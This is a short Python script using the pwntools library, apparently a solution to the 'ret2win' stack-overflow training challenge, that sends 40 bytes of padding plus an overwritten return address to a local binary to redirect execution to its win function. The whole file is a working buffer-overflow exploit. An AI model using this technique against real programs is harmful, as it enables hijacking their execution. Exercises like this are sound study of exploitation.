from pwn import *

# ret2win: 0x0000000000400811

p = process("./ret2win")
p.recvuntil("> ")
p.sendline("A"*40+p64(0x400811))
p.interactive()
